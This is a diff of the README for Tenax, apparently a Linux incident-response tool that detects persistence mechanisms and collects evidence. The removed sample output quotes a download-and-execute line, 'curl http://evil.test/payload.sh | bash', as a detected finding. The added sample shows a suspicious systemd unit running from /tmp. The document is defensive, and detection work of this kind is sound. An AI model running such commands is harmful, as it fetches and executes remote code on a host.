@@ -1,242 +1,229 @@
 # Tenax
 
-> Incident Response Tool/Playbook for Linux Systems
+Tenax is a Linux persistence triage and evidence collection tool for incident response.
 
----
+It is designed to help responders inspect known persistence surfaces, collect supporting artifacts, and understand what Tenax did and did not cover during a run. The current repository focuses on truthful local analysis and collection, not remote acquisition, orchestration, or response automation.
 
-## 🚀 Download and Execution
+## Current Scope
+
+Tenax currently provides two CLI workflows:
+
+- `tenax analyze` runs the built-in analyzer modules, enriches and deduplicates findings, applies user-selected filters, and writes text or JSON output.
+- `tenax collect` gathers artifacts from the built-in collection modules, follows bounded path references, and writes an investigation bundle under `output/`.
+
+Built-in module families currently registered in the codebase:
+
+- `at_jobs`
+- `autostart_hooks`
+- `capabilities`
+- `containers`
+- `cron`
+- `environment_hooks`
+- `ld_preload`
+- `network_hooks`
+- `pam`
+- `rc_init`
+- `shell_profiles`
+- `ssh`
+- `sudoers`
+- `systemd`
+- `tmp_paths`
+
+## Scope And Limitations
+
+Tenax is Linux-only. The codebase depends on Linux filesystem semantics and POSIX account metadata modules such as `pwd` and `grp`.
+
+Tenax does not claim complete persistence coverage. It inspects the built-in surfaces above and reports limitations alongside results, including:
+
+- module execution failures
+- user-supplied filtering
+- live-host versus mounted-root targeting
+- user enumeration scope
+- permission and access boundaries
+- collection reference-depth limits
+
+An absence of findings is not a claim that the system is clean unless the operator has also reviewed the run limitations and target coverage.
+
+## Installation
+
+Tenax now ships with `pyproject.toml` packaging metadata and a console entry point.
 
 ```bash
-git clone https://github.com/norminton/tenax.git
-cd tenax
-python tnx.py analyze
+python -m pip install .
+tenax --help
 ```
 
-Recommended:
+For contributor workflows:
 
 ```bash
-sudo python tnx.py analyze
-sudo python tnx.py analyze --help
-sudo python tnx.py collect --mode <mode>
-sudo python tnx.py collect --help
+python -m venv .venv
+source .venv/bin/activate
+python -m pip install --upgrade pip
+python -m pip install -e .
+python -m pip install pytest
 ```
 
----
+## CLI Usage
 
-## 🧠 What It Does
+Analyze the live host:
 
-Tenax is a tool built to help **Incident Response analysts** collect, analyze, and investigate Linux systems.
+```bash
+tenax analyze
+```
 
-The focus of this tool is detecting **persistence mechanisms** 
+Analyze a mounted target root and keep only higher-severity SSH and systemd findings:
 
-Place it onto the affected box, snapshot, or clone, then run both:
+```bash
+tenax analyze \
+  --root-prefix /mnt/forensics/image \
+  --source ssh,systemd \
+  --severity high \
+  --sort severity \
+  --top 25
+```
 
-- `analyze`
-- `collect`
+Collect a structured investigation bundle:
 
-These will:
+```bash
+tenax collect --mode structured
+```
 
-- surface high-probability persistence
-- score findings by severity
-- explain *why* something is suspicious
-- provide a **starting point** for investigation
+Collect an evidence bundle from a mounted target root:
 
-I emphasize **starting point**! This is not, and will never be, a catch-all.
+```bash
+tenax collect \
+  --mode evidence \
+  --root-prefix /mnt/forensics/image \
+  --modules ssh,pam,systemd \
+  --archive
+```
 
-What it *does* do is dramatically reduce time-to-triage and give you immediate direction during an investigation.
+## Example Analyze Output
 
----
-
-If your team already has a collection/analysis workflow, Tenax still provides value.
-
-I’ve included a detailed [Persistence Playbook](docs/README.md)
-
-This documents every major persistence mechanism actively used by:
-- APT groups
-- red teams
-- opportunistic attackers
-  
-And displays the locations to analyze/triage, as well as the methods to do so.  
-
----
-
-## 🔎 Example Output (Analyze)
+This sample reflects the current text renderer in `tenax/reporter.py`.
 
 ```text
-=== CRITICAL FINDINGS (3) ===
+=== TENAX ANALYZE RESULTS ===
+Findings shown: 2 of 2
+Modules: 2/2 succeeded
+Limitations:
+- Only the selected analyzer modules were executed.
+- Analysis targeted mounted root /mnt/forensics/image.
+- User-scoped modules enumerated 3 local user home paths.
+- Unreadable target paths may reduce observable findings; only accessible artifacts can be analyzed.
 
-====================================================================================================
-[1] TX-UNSET | SHELL PROFILES | CRITICAL
-Path: /home/nadmin/.bashrc
-Score: 275
-Primary Reason: Shell profile downloads and executes payload inline
-Reasons:
-  - Shell profile executes suspicious command
-  - Shell profile downloads content from a remote URL
-  - Shell profile downloads and executes payload inline
-  - Shell profile combines download behavior with active execution logic
-Preview: line 126: curl http://evil.test/payload.sh | bash
+CRITICAL (1)
+TX-SYSTEMD-8A15F2C1 CRITICAL systemd /etc/systemd/system/dbus-update.service
+  score=115 rule=TX-RULE-SYSTEMD-SERVICE_DEFINITION
+  reason=systemd service executes payload from a temporary path
+  tags=root-execution, scheduled-start, service-definition, system-scope, systemd, systemd-unit, temp-path
+  preview=ExecStart=/tmp/.cache/dbus-update --daemon
 
-====================================================================================================
-[2] TX-UNSET | ENVIRONMENT HOOKS | CRITICAL
-Path: /home/nadmin/.bashrc
-Score: 275
-Primary Reason: Environment hook downloads and executes payload inline
-Reasons:
-  - Environment hook executes suspicious command
-  - Environment hook downloads content from a remote URL
-  - Environment hook downloads and executes payload inline
-  - Environment hook combines download behavior with active execution logic
-Preview: line 126: curl http://evil.test/payload.sh | bash
+HIGH (1)
+TX-SSH-4A32A7E0 HIGH ssh /root/.ssh/authorized_keys
+  score=74 rule=TX-RULE-SSH-SSH_PERSISTENCE
+  reason=authorized_keys entry uses command= restriction/execution
+  tags=credential-surface, ssh, ssh-persistence, user-persistence, user-scope
+  preview=command="/usr/local/bin/keywrap" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...
 ```
 
----
+## Example Collect Output
 
-## 📊 Coverage
+Current collection runs create a timestamped bundle and write a short terminal summary:
 
-Tenax analyzes and collects across ALL major Linux persistence surfaces:
+```text
+=== TENAX COLLECT RESULTS ===
+Mode: evidence
+Artifacts: 3
+References: 2
+Errors: 0
+Saved manifest to: /cases/tenax-output/collect_20260326_141530/manifest.json
+Saved archive to: /cases/tenax-output/collect_20260326_141530.tgz
+```
 
-### Analyze Coverage
-
-- Systemd services (`/etc/systemd`, `/lib/systemd`)
-- Cron jobs (`/etc/crontab`, `/etc/cron.d`, `/var/spool/cron`)
-- SSH (`authorized_keys`, ssh configs)
-- PAM (`/etc/pam.d`)
-- Shell profiles (`.bashrc`, `.profile`, `.zshrc`)
-- Environment hooks (`/etc/profile`, `/etc/environment`)
-- LD preload / library hijacking
-- Network hooks (`/etc/network`, NetworkManager, ppp)
-- Temporary execution paths (`/tmp`, `/dev/shm`)
-- Sudoers configuration
-- RC/init scripts
-- Autostart entries
-- Container persistence locations
-- Linux capabilities abuse
-
-Detection includes:
-- command execution patterns
-- download + execute chains
-- encoded payload execution
-- reverse shells
-- path hijacking
-- environment abuse
-- privilege manipulation
-
----
-
-### Collect Coverage
-
-The `collect` command builds a structured evidence bundle including:
-
-- file metadata (owner, perms, timestamps)
-- SHA256 hashes
-- parsed file content
-- referenced file chaining (recursive)
-- grouped artifacts by persistence surface
-- clean output for investigation and reporting (TXT/JSON)
-
-Collection modes:
-
-| Mode       | Description |
-|-----------|------------|
-| inventory | Metadata only |
-| parsed    | Includes parsed file content |
-| evidence  | Copies artifacts + references |
-| archive   | Full bundle + compressed `.tgz` |
-
----
-
-## 📦 Output
-
-Tenax outputs structured results into the `output/` directory:
+Saved bundle layout:
 
 ```text
 output/
-└── collect_YYYYMMDD_HHMMSS/
-    ├── manifest.json
-    ├── summary.txt
-    ├── references.json
-    ├── errors.json
-    ├── hashes.txt
-    └── collected/
-        ├── systemd/
-        ├── cron/
-        ├── ssh/
-        └── ...
+`-- collect_20260326_141530/
+    |-- artifacts.json
+    |-- errors.json
+    |-- hashes.txt
+    |-- manifest.json
+    |-- references.json
+    |-- summary.txt
+    `-- collected/
+        |-- ssh/
+        |   `-- etc_ssh/sshd_config
+        `-- ssh_reference/
+            `-- opt/payload.sh
 ```
 
-Key points:
-
-- Artifacts are grouped by **persistence surface**
-- References are recursively followed (where possible)
-- Everything is preserved for **investigation and reporting**
-- Output is designed to be readable without additional tooling
-
----
-
-## 🧭 Repo Buildout
+Representative `summary.txt` excerpt:
 
 ```text
-tenax/
-├── docs/
-│   ├── modules/
-│   │   ├── at-jobs.md
-│   │   ├── autostart-hooks.md
-│   │   ├── capabilities.md
-│   │   ├── containers.md
-│   │   ├── cron.md
-│   │   ├── environment-hooks.md
-│   │   ├── ld-preload.md
-│   │   ├── network-hooks.md
-│   │   ├── pam.md
-│   │   ├── rc-init.md
-│   │   ├── shell-profiles.md
-│   │   ├── ssh.md
-│   │   ├── sudoers.md
-│   │   ├── systemd.md
-│   │   └── tmp-paths.md
-│   ├── README.md
-│   ├── analyst-guide.md
-│   ├── apt-tradecraft-notes.md
-│   ├── attack-mapping.md
-│   ├── false-positives.md
-│   ├── methodology.md
-│   └── triage-principles.md
-├── output/
-├── tenax/
-│   ├── checks/
-│   │   ├── __init__.py
-│   │   ├── at_jobs.py
-│   │   ├── autostart_hooks.py
-│   │   ├── capabilities.py
-│   │   ├── containers.py
-│   │   ├── cron.py
-│   │   ├── environment_hooks.py
-│   │   ├── ld_preload.py
-│   │   ├── network_hooks.py
-│   │   ├── pam.py
-│   │   ├── rc_init.py
-│   │   ├── shell_profiles.py
-│   │   ├── ssh.py
-│   │   ├── sudoers.py
-│   │   ├── systemd.py
-│   │   └── tmp_paths.py
-│   ├── __init__.py
-│   ├── analyzer.py
-│   ├── banner.py
-│   ├── cli.py
-│   ├── collector.py
-│   ├── reporter.py
-│   └── utils.py
-├── tests/
-│   ├── test_cron.py
-│   ├── test_scoring.py
-│   └── test_systemd.py
-├── .gitignore
-├── LICENSE
-├── README.md
-├── config.yaml
-├── main.py
-├── requirements.txt
-└── setup.py
+=== TENAX COLLECT SUMMARY ===
+
+Collection ID: collect_20260326_141530
+Mode: evidence
+Host: ir-workstation
+User: analyst
+Target Root: /
+
+--- Totals ---
+Artifacts collected: 3
+Direct artifacts: 1
+Reference artifacts: 2
+References found: 2
+Required references followed: 2 of 2
+Artifacts copied: 3
+Errors: 0
 ```
+
+Additional examples are documented in [docs/usage-examples.md](docs/usage-examples.md).
+
+## Repository Layout
+
+```text
+.
+|-- docs/
+|   |-- architecture.md
+|   |-- usage-examples.md
+|   |-- analyst-guide.md
+|   `-- modules/
+|-- output/
+|-- tenax/
+|   |-- analyzer.py
+|   |-- cli.py
+|   |-- collector.py
+|   |-- reporter.py
+|   |-- scope.py
+|   `-- checks/
+|-- tests/
+|-- CONTRIBUTING.md
+|-- LICENSE
+|-- pyproject.toml
+|-- pytest.ini
+`-- tnx.py
+```
+
+## Development And Testing
+
+Run the current test suite with:
+
+```bash
+python -m pytest
+```
+
+The GitHub Actions workflow runs installation plus `pytest` on Ubuntu.
+
+## Documentation
+
+- [Contributor guide](CONTRIBUTING.md)
+- [Architecture overview](docs/architecture.md)
+- [Usage examples](docs/usage-examples.md)
+- [Analyst playbook](docs/README.md)
+
+## License
+
+Tenax is licensed under the Apache License 2.0. See [LICENSE](LICENSE).
